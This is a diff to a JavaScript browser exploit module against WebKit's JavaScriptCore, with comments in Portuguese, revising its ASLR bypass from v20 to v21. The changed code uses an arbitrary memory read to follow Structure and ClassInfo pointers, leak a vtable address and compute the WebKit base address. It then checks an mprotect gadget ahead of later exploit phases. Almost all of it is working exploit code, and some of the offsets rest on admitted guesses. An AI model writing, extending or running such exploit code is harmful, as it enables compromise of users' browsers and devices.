@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v20 - Fortificando Alocacao OOB - Calculo ASLR Revisado)
+// js/script3/testArrayBufferVictimCrash.mjs (v21 - Calculo ASLR CORRETO da Base WebKit)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v20 - Fortificando Alocacao OOB - Calculo ASLR Revisado"; // Versão atualizada
+export const FNAME_MODULE = "v21 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -437,22 +437,39 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
+        // structure_pointer_from_dummy_object_addr é o endereço do ponteiro para a Structure (dentro do JSCell)
         const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8);
+        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); // Valor do ponteiro para o objeto Structure
+
+        logFn(`[ASLR LEAK] Endereço da Structure do dummy_object (vazado): ${structure_address_from_leak.toString(true)}`, "leak");
 
         if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
             const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
-        logFn(`[ASLR LEAK] SUCESSO na leitura do ponteiro da Structure após ajuste: ${structure_address_from_leak.toString(true)}`, "leak");
 
-        // O resto da Fase 3 continua igual se a leitura da Structure for bem-sucedida
-        // DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE está sendo usado como offset da vtable do DataView
-        // para a base da biblioteca, o que é conceitualmente o que queremos para o cálculo da base.
-        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-        
-        webkit_base_address = structure_address_from_leak.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
+        // AGORA, vazaremos o endereço da Vtable da ClassInfo, que está dentro da WebKit
+        // ClassInfo Address = Structure Address + JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
+        const class_info_address = structure_address_from_leak.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
+        logFn(`[ASLR LEAK] Endereço da ClassInfo do dummy_object: ${class_info_address.toString(true)}`, "info");
+
+        // Endereço da Vtable da ClassInfo = ClassInfo Address + JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET (0x8)
+        const vtable_class_info_address_in_webkit = await arb_read(class_info_address.add(JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET), 8);
+        logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
+
+        if (!isAdvancedInt64Object(vtable_class_info_address_in_webkit) || vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero) || (vtable_class_info_address_in_webkit.low() & 0xFFF) !== 0x000) {
+            const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+
+        // CÁLCULO DA BASE WEBKIT:
+        // webkit_base_address = vtable_class_info_address_in_webkit - Offset_da_Vtable_ClassInfo_no_binario
+        // JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET (0x3AD62A0) é o offset da vtable da DataView
+        // *dentro do binário*. Vamos assumir que o offset da vtable da ClassInfo do JSObject é próximo ou o mesmo.
+        const OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        webkit_base_address = vtable_class_info_address_in_webkit.sub(OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE);
 
         if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
             const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
@@ -461,6 +478,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");
 
+        // ... (Verificação de gadget mprotect_plt_stub, FASE 4, FASE 5)
         const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
         const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
         logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
